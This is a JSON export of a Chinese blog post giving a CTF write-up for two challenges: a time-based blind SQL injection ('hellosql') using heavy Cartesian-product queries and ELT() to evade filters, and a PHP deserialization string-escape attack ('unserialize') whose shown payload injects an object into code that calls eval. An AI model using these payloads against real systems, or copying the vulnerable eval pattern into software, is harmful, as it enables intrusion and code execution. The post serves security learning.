{"title":"巅峰极客","uid":"cdb488d648a90943d7354784532a6374","slug":"巅峰极客","date":"2023-07-31T12:38:30.000Z","updated":"2023-08-01T09:17:46.710Z","comments":true,"path":"api/articles/巅峰极客.json","keywords":null,"cover":[],"content":"<h1 id=\"巅峰极客\"><a href=\"#巅峰极客\" class=\"headerlink\" title=\"巅峰极客\"></a>巅峰极客</h1><h2 id=\"hellosql\"><a href=\"#hellosql\" class=\"headerlink\" title=\"hellosql\"></a>hellosql</h2><ul>\n<li>这个题我知道是时间延迟注入，也知道用笛卡尔积，但是我当时的方法就是测不出来\t</li>\n<li>过滤了<code>* if 空格</code></li>\n</ul>\n<h3 id=\"时间延迟\"><a href=\"#时间延迟\" class=\"headerlink\" title=\"时间延迟\"></a>时间延迟</h3><p><strong>我当时用的是</strong></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> A<span class=\"token punctuation\">.</span>table_name <span class=\"token keyword\">FROM</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> A<span class=\"token punctuation\">,</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> B<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><strong>boogipop的wp</strong></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> group_concat<span class=\"token punctuation\">(</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">FROM</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> A<span class=\"token punctuation\">,</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> B<span class=\"token punctuation\">,</span>information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> c<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"过滤if\"><a href=\"#过滤if\" class=\"headerlink\" title=\"过滤if\"></a>过滤if</h3><p>我当时用的是,但是当时测试并不成功</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> fid <span class=\"token keyword\">from</span> <span class=\"token keyword\">file</span> <span class=\"token keyword\">WHERE</span> fid<span class=\"token operator\">=</span><span class=\"token number\">10</span> <span class=\"token operator\">or</span> <span class=\"token keyword\">COALESCE</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token operator\">&lt;</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><strong>boogipop的wp</strong></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">'or+elt(3>2,(SELECT+group_concat('</span><span class=\"token number\">1</span><span class=\"token string\">')+FROM+information_schema.columns+A,+information_schema.columns+B))+or'</span><span class=\"token number\">2</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<ul>\n<li><p>MySQL 中的 ELT() 函数是一个字符串函数，用于根据一个给定的索引值，返回一个列表中对应索引位置的元素。该函数的语法如下，这样就会返回后面的语句<br>:::info</p>\n</li>\n<li><p>对于这个group_concat(‘1’)，我也看到有用sum(0)的，总之就是让它随便算一个，因为后面的表已经足够大了<br>:::</p>\n</li>\n</ul>\n<h2 id=\"wp\"><a href=\"#wp\" class=\"headerlink\" title=\"wp\"></a>wp</h2><ul>\n<li>我在想是不是我的闭合有问题，导致我没有测试成功</li>\n<li>but这个题真的很简单</li>\n</ul>\n<h2 id=\"unserialize\"><a href=\"#unserialize\" class=\"headerlink\" title=\"unserialize\"></a>unserialize</h2><h3 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h3><details class=\"custom-details\">\n<summary>Click to see more</summary>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">include_once</span> <span class=\"token string double-quoted-string\">\"my.php\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">include_once</span> <span class=\"token string double-quoted-string\">\"function.php\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'login'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;script>alert(`Login First!`);location.href=`./index.php`;&lt;/script>'</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token variable\">$login</span> <span class=\"token operator\">=</span> @<span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token function\">a</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'login'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//字符减少</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$login</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">pull_it</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$x</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$xx</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">x</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$xx</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\n\t<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">x</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t\t<span class=\"token variable\">$preg_match</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'return preg_match(\"/[A-Za-z0-9]+/i\", $this->x);'</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$preg_match</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t\t<span class=\"token keyword\">echo</span> <span class=\"token variable\">$preg_match</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"save_waf\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">&#125;</span>\n\t\t@<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">x</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token punctuation\">&#125;</span>\t\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">push_it</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">private</span> <span class=\"token variable\">$root</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">private</span> <span class=\"token variable\">$pwd</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$root</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$pwd</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">root</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$root</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">pwd</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$pwd</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t\n\t\t<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">root</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">pwd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\n\t<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">root</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">pwd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h1>Hello, <span class=\"token interpolation\"><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">root</span></span>&lt;/h1>\"</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">&#125;</span>\n\t\t<span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n\t\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h1>out!&lt;/h1>\"</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\n\n\n<span class=\"token punctuation\">&#125;</span>\n\n\n\n<span class=\"token delimiter important\">?></span></span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">include_once</span> <span class=\"token string double-quoted-string\">\"my.php\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">include_once</span> <span class=\"token string double-quoted-string\">\"function.php\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">include_once</span> <span class=\"token string double-quoted-string\">\"login.html\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'root'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pwd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token variable\">$root</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'root'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$pwd</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pwd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$login</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">push_it</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$root</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$pwd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\n\t<span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'login'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">b</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$login</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//过滤后字符变多</span>\n\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'&lt;script>location.href=`./login.php`;&lt;/script>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token punctuation\">&#125;</span>\n\n\n\n<span class=\"token delimiter important\">?></span></span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">b</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">return</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'aaaa'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'bbbbbb'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">a</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">return</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'bbbbbb'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'aaaa'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// echo strlen(a('bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb'));</span>\n<span class=\"token comment\">// echo strlen('\";s:3:\"pwd');</span>\n\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n</p>\n</details>\n<h3 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h3><p><img src=\"/../%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/1.png\" alt=\"image.png\"><br /><img src=\"/../%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/2.png\" alt=\"image.png\"></p>\n<ol>\n<li><strong>类不一样咋办？</strong></li>\n</ol>\n<ul>\n<li>我知道是反序列化，但是我在做题的时候，没想明白这里序列化的是<code>push_it</code>，但是反序列化需要用到<code>pull_it</code>，这怎么办？</li>\n</ul>\n<ol start=\"2\">\n<li><strong>可以逃逸啊</strong></li>\n</ol>\n<p><img src=\"/../%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/3.png\" alt=\"image.png\"></p>\n<ul>\n<li>由于<code>a</code>函数是字符变少的，所以一定是字符减少的反序列化，既然普通的属性可以逃逸，那也可以逃逸<code>pull_it</code>这个类</li>\n</ul>\n<ol start=\"3\">\n<li><strong>如何构造字符</strong><code>**b**</code><strong>的数量？</strong></li>\n</ol>\n<p><img src=\"/../%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/image-20230801171742815.png\" alt=\"image-20230801171742815\"></p>\n<ul>\n<li>根据我的笔记，字符减少的反序列化需要把前面的闭合，也就是我需要知道这部分的长度</li>\n</ul>\n<p><img src=\"/../%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/4.png\" alt=\"image.png\"></p>\n<ul>\n<li><strong>看到上面的属性是private，就需要格外注意，url编码后输出是</strong><code>**%00类%00属性**</code><strong>，第一行没输出是因为</strong><code>**%00**</code><strong>是不可见字符</strong></li>\n<li><strong>这里可以把它当成空格，按照空格来计算字符长度，但是传值时要编码成</strong><code>**%00**</code></li>\n<li>计算下面字符串的长度，因为<code>6b ---&gt;  4a</code>，少2个字符，现在需要空出<code>28</code>个字符，所以b的长度应为</li>\n</ul>\n<p><code>28 / 2 * 6 = 84</code></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'\";s:12:\" push_it pwd\";s:47:\"'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">//长度为28</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<ul>\n<li>所以给root和pwd传值</li>\n</ul>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">root<span class=\"token operator\">=</span>bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\n<span class=\"token operator\">&amp;</span>pwd<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\";s:3:\"</span>pwd<span class=\"token string double-quoted-string\">\";O:7:\"</span>pull_it<span class=\"token string double-quoted-string\">\":1:&#123;s:1:\"</span>x<span class=\"token string double-quoted-string\">\";s:2:\"</span>ls\"<span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<ul>\n<li>这里再传一个<code>pwd</code>是因为前面的pwd已经被包裹进去了，而<code>push_it</code>有两个属性，所以得加上。</li>\n<li>这里既可以只写<code>pwd</code>，也可以url编码后改为<code>%00pull_it%00pwd</code>，y4师傅的博客中说php7.1以上时对类属性不敏感，不写也可以正常输出</li>\n</ul>\n<p><img src=\"/../%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/5.png\" alt=\"image.png\"></p>\n<ol start=\"4\">\n<li><strong>反序列化时进行了正则匹配，需要绕过？</strong></li>\n</ol>\n<p><img src=\"/../%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/6.png\" alt=\"image.png\"></p>\n<ul>\n<li>无字母的webshell，上传数据包，用<code>.</code>配合通配符执行文件</li>\n</ul>\n","feature":true,"text":"巅峰极客hellosql 这个题我知道是时间延迟注入，也知道用笛卡尔积，但是我当时的方法就是测不出来 过滤了* if 空格 时间延迟我当时用的是 SELECT A.table_name FROM information_schema.columns A, information_...","link":"","photos":[],"count_time":{"symbolsCount":"3.3k","symbolsTime":"3 mins."},"categories":[],"tags":[{"name":"CTF","slug":"CTF","count":4,"path":"api/tags/CTF.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2\"><span class=\"toc-text\">巅峰极客</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#hellosql\"><span class=\"toc-text\">hellosql</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%97%B6%E9%97%B4%E5%BB%B6%E8%BF%9F\"><span class=\"toc-text\">时间延迟</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%BF%87%E6%BB%A4if\"><span class=\"toc-text\">过滤if</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#wp\"><span class=\"toc-text\">wp</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#unserialize\"><span class=\"toc-text\">unserialize</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E9%A2%98%E7%9B%AE\"><span class=\"toc-text\">题目</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF\"><span class=\"toc-text\">思路</span></a></li></ol></li></ol></li></ol>","author":{"name":"XyM4ster","slug":"blog-author","avatar":"/images/picture.jpg","link":"/","description":"热爱网络安全的BITer","socials":{"github":"https://github.com/XyM4ster","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"re-engineer-core-principle","uid":"a3921abd6a7c73ab6b942ac2f92b0322","slug":"re-engineer-core-principle","date":"2023-10-13T01:04:12.000Z","updated":"2023-10-16T15:01:41.005Z","comments":true,"path":"api/articles/re-engineer-core-principle.json","keywords":null,"cover":[],"text":"引言看《逆向工程核心原理》这本书 好久之前看了这本书的一部分，现在决定重新学一下。 感觉逆向十分重要，且我的hxd wd-2711(https://wd-2711.tech/)一直在学逆向，在他的感染下，我也开始学。 0x01 关于逆向工程 静态分析法：并不执行代码，观察代码文件...","link":"","photos":[],"count_time":{"symbolsCount":"10k","symbolsTime":"9 mins."},"categories":[],"tags":[{"name":"re","slug":"re","count":1,"path":"api/tags/re.json"}],"author":{"name":"XyM4ster","slug":"blog-author","avatar":"/images/picture.jpg","link":"/","description":"热爱网络安全的BITer","socials":{"github":"https://github.com/XyM4ster","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"Context-Sensitivity-without-Contexts-PLDI23","uid":"39f6a6f9864fa629c2ab8230b6f47fbc","slug":"Context-Sensitivity-without-Contexts-PLDI23","date":"2023-10-08T05:40:18.000Z","updated":"2023-10-18T09:35:51.585Z","comments":true,"path":"api/articles/Context-Sensitivity-without-Contexts-PLDI23.json","keywords":null,"cover":[],"text":"引言 学完了南大软件分析的课程，关注了谭老师的个人主页。 想着看一篇论文，能对学的内容有更好的理解。 AbstractQ1：首先说上下文敏感的做法 在不同上下文中分析，分离方法变量，和堆对象，也就是同时应用上下文敏感和堆上下文敏感 Q2：但是这种方法带来了问题： 因为需要clon...","link":"","photos":[],"count_time":{"symbolsCount":"8.1k","symbolsTime":"7 mins."},"categories":[],"tags":[{"name":"Program Analysis","slug":"Program-Analysis","count":3,"path":"api/tags/Program-Analysis.json"},{"name":"论文","slug":"论文","count":2,"path":"api/tags/论文.json"}],"author":{"name":"XyM4ster","slug":"blog-author","avatar":"/images/picture.jpg","link":"/","description":"热爱网络安全的BITer","socials":{"github":"https://github.com/XyM4ster","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}